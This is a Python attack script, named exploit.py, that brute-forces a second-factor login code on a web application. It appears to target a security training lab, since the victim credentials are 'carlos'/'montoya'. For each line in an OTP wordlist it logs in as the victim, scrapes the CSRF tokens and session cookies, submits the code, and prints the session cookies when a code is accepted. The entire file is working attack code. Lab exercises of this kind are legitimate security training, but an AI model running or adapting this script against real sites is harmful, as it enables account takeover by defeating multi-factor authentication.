import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if (len(sys.argv) != 2):
    print("USAGE: exploit.py <url>")
    sys.exit(1)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = sys.argv[1]
victim = "carlos"
passwd = "montoya"


file1 = open('creds/otp_pay','r')
opts = file1.readlines()
i = 1
for otp in opts:
    print("{}".format(i),end="\r",flush=True)
    i = i + 1
    r1 = requests.get(url+'login',proxies=proxies,verify=False)
    cookie_value = r1.cookies['session']
    
    print("Request 1 done",end="\r",flush=True)
    csrf = re.search('csrf"\ value="(.*?)">',r1.text).group(1)
    
    headers = {'Cookie': 'session='+cookie_value}
    data = {'csrf':csrf,'username':victim,'password':passwd}
    
    r2 = requests.post(url+'login',data=data,headers=headers,proxies=proxies,verify=False, allow_redirects=False)

    print("Request 2 done",end="\r",flush=True)
    if "Invalid username or password." not in r2.text:
        cookie_value = r2.cookies['session']
        headers = {'Cookie': 'session='+cookie_value}

        r3 = requests.get(url+'login2',headers=headers,proxies=proxies,verify=False)
        
        print("Request 3 done",end="\r",flush=True)
        #print(r3.text)
        csrf = re.search('csrf"\ value="(.*?)">',r3.text).group(1)
        data = {'csrf': csrf,'mfa-code': str(otp)[:-1]}
        r4 = requests.post(url+'login2',headers=headers,data=data,proxies=proxies,verify=False,allow_redirects=False)
        if "Incorrect security code" not in r4.text:
            print(r4.cookies)
            print(otp)
    else:
        print("login falied")
